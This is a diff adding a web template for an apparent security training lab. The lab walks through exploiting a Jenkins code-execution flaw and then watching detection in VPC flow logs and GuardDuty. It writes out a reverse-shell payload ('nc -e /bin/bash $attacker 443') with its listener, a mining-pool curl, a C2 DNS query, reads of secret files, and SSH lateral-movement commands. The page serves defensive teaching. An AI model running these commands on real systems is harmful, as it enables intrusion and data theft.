@@ -1,0 +1,336 @@
+{% extends "base.html" %}
+{% block title %}Section 2 - Launching the attack {% endblock %}
+{% block content %}
+<section class="card shadow p-3" id="collapse-section1" style="visibility: visible">
+    <div class="card-body" style="width: auto">
+
+        <div xmlns="http://www.w3.org/1999/html">
+            <h1>Section 2 - Launching the attack </h1>
+        </div>
+        <p class="card-text">
+            In this section we will look at an attack in more detail and take control of the vulnerable server that we
+            identifed is Section 1<br><br>
+            You have two options for completing this section
+        <ol>
+            <li>Using the instructions in Labs 2 - 4 below to execute the attack via the command line. <br>
+                <a class="name-color4" target="_blank" href="/static/devdays-lab-manual-version1.5.pdf"> CLI Instructions</a><br></li>
+            <li>Using the Web Interface below to execute the attack</li>
+        </ol>
+        <br>
+
+        The command line lab will allow you to look more closely at the script and payload we use to attack the web server, and provide more detail
+        regarding lateral movement to other targets.
+
+        </p>
+
+        <!--Step 4-->
+        <div class="card-header header-color headersize" style="margin-top: 20px" id="headingExploit">
+            <h5 class="mb-0">
+                <button class="btn btn-link collapsed name-color" data-toggle="collapse" data-target=".multi-collapse4"
+                        aria-expanded="false" aria-controls="#collapsExploit1 #collapsExploit2 #collapsExploit3">
+                    Step 4 - Exploit
+                </button>
+            </h5>
+        </div>
+        <div class="card collapse multi-collapse4 hide card-border shadow p-3"
+             style="margin-top: 20px; margin-bottom: 20px"
+             id="collapsExploit1">
+            <p class="card-text">
+            <h2>Background</h2>
+            In this step we Create the exploit that will allow us to control the web server.
+            The attack process is as follows
+            <ol>
+                <li>Create the payload that we will deliver to the webserver<br>You can find more details on the
+                    execution here <a class="name-color4" target="_blank"
+                                      href="https://ssd-disclosure.com/ssd-advisory-cloudbees-jenkins-
+                                   unauthenticated-code-execution/">cloudbees-jenkins-unauthenticated-code-execution</a>
+                    <br>
+                    'java -jar payload.jar payload.ser "nc -e /bin/bash $attacker 443'<br>
+                    Here we are creating a file "payload.ser that contains a command to execute on the server<br>
+                    'nc -e /bin/bash $attacker 443'
+                </li>
+                <li>Create a listening port on the server that will accept the netcat socket<br>
+                    'nc -lvp 443'
+                </li>
+            </ol>
+            </p>
+        </div>
+        <div class="card collapse multi-collapse4 hide card-border shadow p-3"
+             style="margin-top: 20px; margin-bottom: 20px"
+             id="collapsExploit2">
+            <form style="margin-top: 15px">
+                <div class="form-group">
+                    <button class="btn btn button-color sendbutton"
+                            id="exploit_submit"
+                    >Run Exploit
+                    </button>
+                    <div class="loader" id="spinner" style="visibility: hidden"></div>
+                </div>
+                <div id="successAlert" class="alert alert-success" role="alert" style="display: none"></div>
+                <div id="errorAlert" class="alert alert-danger" role="alert" style="display: none;"></div>
+            </form>
+        </div>
+        <div class="card collapse multi-collapse4 hide card-border shadow p-3 Exploit-output"
+             id="collapsExploit3"
+             style="visibility: collapse">
+    <pre id="Exploit_response">
+     
+    </pre>
+        </div>
+
+        <!--Step 5-->
+        <div class="card-header header-color headersize" style="margin-top: 20px" id="headingLateral">
+            <h5 class="mb-0">
+                <button class="btn btn-link collapsed name-color" data-toggle="collapse" data-target=".multi-collapse5"
+                        aria-expanded="false" aria-controls="#collapseLateral1 #collapseLateral12 #collapseLateral13">
+                    Step 5 - Lateral movement/Data Exfiltration
+                </button>
+            </h5>
+        </div>
+        <div class="card collapse multi-collapse5 hide card-border shadow p-3"
+             style="margin-top: 20px; margin-bottom: 20px"
+             id="collapseLateral1">
+            <p class="card-text">
+            <h2>Background</h2>
+            The attacker now has gained access to the web server with root permissions. From here they will download
+            additional software to gain persistent access to the server, move laterally in the cloud and exfiltrate
+            data. Here we will simulate that process.
+            <h2>Instructions</h2>
+            Run the following commands
+            <ol>
+                <li>Select and run the command 'ps -ef' from the dropdown menu<br>
+                    You will see the java process running Jenkins
+                </li>
+                <li>Select and run the command 'apt-get update -y' from the dropdown menu<br>
+                    You will see the software update
+                </li>
+                <li>Select and run the command 'apt-get install -y dnsutils'<br>You will see the dnsutils package
+                    install
+                </li>
+                <li>Select and run the command 'Generate GuardDuty Bitcoin Mining Alert'<br>This will send the command
+                    "curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk >
+                    /dev/null"
+                    triggering a GuardDuty alert
+                </li>
+                <li>Run any other commands by selecting the 'Run custom command' checkbox and entering the command into
+                    the 'Custom Command' text box
+                </li>
+            </ol>
+            </p>
+        </div>
+        <div class="card collapse multi-collapse5 hide card-border shadow p-3"
+             style="margin-top: 20px; margin-bottom: 20px"
+             id="collapseLateral2">
+            <div>
+                <form id="formsendcmd">
+                    <fieldset>
+                        <div class="form-group">
+                            <label for="customCommandInput">Enter Custom Command:</label>
+                            <input type="text" id="customCommandInput" class="form-control boxcolor"
+                                   placeholder="Custom Command">
+                        </div>
+                        <div class="form-group">
+                            <label for="cmdtosend">Select Command:</label>
+                            <select class="custom-select form-control boxcolor" id="cmdtosend">
+                                <option selected value="ls -al">List directory contents (ls -al)</option>
+                                <option value="ps -ef">View running processes (ps -ef)</option>
+                                <option value="netstat -an">View current network connections (netstat -an)</option>
+                                <option value="whoami">Identify running user (whoami)</option>
+                                <option value="apt-get update -y">Update application repository (apt-get update -y)</option>
+                                <option value="apt-get install -y dnsutils">Install DNSUtils (apt-get install -y dnsutils)</option>
+                                <option value="dig GuardDutyC2ActivityB.com any">dig GuardDutyC2ActivityB.com any
+                                </option>
+                                <option value="curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk > /dev/null">
+                                    Generate GuardDuty Bitcoin Mining Alert
+                                </option>
+                                <option value="ls -al /secret">List secret folder contents (ls -al /secret)</option>
+                                <option value="cat /secret/jenkins-flag.txt">Capture the Jenkins server flag</option>
+                                <option value="cat /secret/log_copy">Read the Jenkins log copy automation script</option>
+                                <option value="ssh $AUTOMATION ls -al">List automation server default directory contents</option>
+                                <option value="ssh $AUTOMATION whoami">Identify running automation user</option>
+                                <option value="ssh $AUTOMATION ls -al /secret">List automation server secret directory contents</option>
+                                <option value="ssh $AUTOMATION cat /secret/upload_log">Read automation server upload_log script</option>
+                            </select>
+                        </div>
+
+                        <div class="custom-control custom-checkbox">
+                            <input type="checkbox" class="custom-control-input" id="disabledFieldsetCheck">
+                            <label class="custom-control-label" for="disabledFieldsetCheck">Run custom command</label>
+                        </div>
+
+                        <button class="btn btn button-color sendbutton" style="margin-top: 17px" id="send_submit"
+                        >Run Command
+                        </button>
+                    </fieldset>
+                </form>
+            </div>
+            <div>
+                <div class="loader4" id="spinnerlatmove" style="visibility: hidden"></div>
+            </div>
+        </div>
+        <div class="card collapse multi-collapse5 hide card-border shadow p-3" id="collapseLateral3"
+             style="visibility: collapse">
+           <pre id="lateral_response" style="line-height:1">
+    </pre>
+        </div>
+
+        <!--Step 6-->
+        <div class="card-header header-color headersize" style="margin-top: 20px" id="headingVPC">
+            <h5 class="mb-0">
+                <button type="button" class="btn btn-link name-color" data-toggle="collapse"
+                        data-target=".multi-collapse6"
+                        aria-expanded="true" aria-controls="#collapseQuery1 #collapseQuery2 #collapseQuery3">
+                    Step 6 - Show VPC Flow Logs
+                </button>
+            </h5>
+        </div>
+        <div class="card collapse multi-collapse6 hide card-border shadow p-3"
+             style="margin-top: 20px; margin-bottom: 20px"
+             id="collapseLateralvpc">
+            <p class="card-text">
+            <h2>Background</h2>
+            We have enabled VPC flow logs. When we query the logs we see application traffic on port 80 and see the
+            outbound connection on port 443 but nothing to indicate that there is a problem as the attack has been at
+            the application layer.
+
+            </p>
+        </div>
+        <div class="card collapse multi-collapse6 card-border shadow p-3" style="margin-top: 20px; margin-bottom: 20px"
+             id="collapseQuery1">
+            <form>
+                <div class="row">
+                    <div class="form-group col-md-6">
+                        <label>
+                            <h6>Units:</h6>
+                        </label>
+                        <select class="form-control units boxcolor" id="time_interval">
+                            <option value="hours">Hours</option>
+                            <option value="minutes">Minutes</option>
+                            <option value="seconds">Seconds</option>
+                            <option value="days">Days</option>
+                        </select>
+                    </div>
+                    <div class="form-group col-md-6">
+                        <label>
+                            <h6>Time Interval:</h6>
+                        </label>
+                        <select class="form-control units boxcolor" id="time_value">
+                            <option value="1">1</option>
+                            <option value="2">2</option>
+                            <option value="3">3</option>
+                            <option value="4">4</option>
+                            <option value="5">5</option>
+                            <option value="6">6</option>
+                            <option value="7">7</option>
+                            <option value="8">8</option>
+                            <option value="9">9</option>
+                            <option value="10">10</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="form-group" style="margin-top: 20px">
+                    <label>
+                        <h6>VPC Flow Log - Cloudwatch Log Group:</h6>
+                    </label>
+                    <!--ghtr-vpc-flow-log-->
+                    <input type="text" class="form-control boxcolor" id="log_group_name" value="{{log_group}}"
+                           readonly>
+                </div>
+
+                <div class="form-group" style="margin-top: 20px">
+                    <label>
+                        <h6>Filter String:</h6>
+                    </label>
+                    <input type="text" class="form-control boxcolor" id="query_string"
+                           value='filter srcAddr="{{attacker_ip}}"'>
+                </div>
+                <div>
+                    <button class="btn btn button-color sendbutton btn-md" style="margin-top: 10px"
+                            id="queryVpc">Submit
+                    </button>
+                </div>
+            </form>
+            <div>
+                <div class="loader2" id="spinnerflowlog" style="visibility: hidden"></div>
+            </div>
+        </div>
+
+        <div class="card shadow collapse multi-collapse6 card-border p-3" style="visibility: hidden" id="query_vpc_out">
+            <div>
+                <table id="tableflowlog"></table>
+            </div>
+
+        </div>
+        <div class="card shadow collapse multi-collapse6 card-border p-3" style="visibility: hidden"
+             id="query_vpc_out_error">
+            <pre id="vpcquery_response">
+                        </pre>
+        </div>
+
+        <!--Step 7-->
+        <div class="card-header header-color headersize" style="margin-top: 20px" id="headingQuerylogs">
+            <h5 class="mb-0">
+                <button class="btn btn-link collapsed name-color" data-toggle="collapse" data-target=".multi-collapse7"
+                        aria-expanded="false" aria-controls="#collapsQuerylogs1 #collapsQuerylogs2 #collapsQuerylogs3">
+                    Step 7 - Show Guard Duty Logs
+                </button>
+            </h5>
+        </div>
+                <div class="card collapse multi-collapse7 hide card-border shadow p-3"
+             style="margin-top: 20px; margin-bottom: 20px"
+             id="collapseLateralog">
+            <p class="card-text">
+            <h2>Background</h2>
+            We see a GuardDuty alert for bitcoin mining but nothing to indicate how the application was compromised.
+
+            </p>
+        </div>
+
+        <div class="card collapse multi-collapse7 card-border shadow p-3" style="margin-top: 20px"
+             id="collapsQuerylogs1">
+            <div class="row">
+                <form class="form-group col-md-6">
+                    <label>
+                        <h6>Select Guard Duty Event Types</h6>
+                    </label>
+                    <select name="my" class="form-control units boxcolor" id="guardDutyEventsSelect" multiple required>
+                        {% for event_name in gd_events_of_interest %}
+                        <option value="{{event_name}}">{{event_name}}</option>
+                        {% endfor %}
+                    </select>
+                </form>
+                </form>
+            </div>
+        </div>
+
+        <div class="card card collapse multi-collapse7 card-border shadow p-3 treebody"
+             style="margin-top: 20px; margin-bottom: 20px">
+            <div>
+                <button class="btn btn button-color sendbutton btn-md" id="queryGdSubmit">Submit
+                </button>
+            </div>
+            <div>
+                <div class="loader5" id="spinnerdutylogs" style="visibility: hidden"></div>
+            </div>
+            <div class="root" style="margin-top: 20px"></div>
+        </div>
+
+        <div style="margin-top: 20px">
+            <a class="name-color2" href="{{ url_for('launch_phase3') }}">Section 3 - Manage CrowdStrike Protection</a>
+        </div>
+    </div>
+
+
+    </div>
+</section>
+
+{% endblock content %}
+{% block scriptblock %}
+
+<script src="/static/jenkins-common.js"></script>
+<script src="/static/phase2.js"></script>
+<script src="/static/jsonview.js"></script>
+
+
+{% endblock scriptblock %}
+
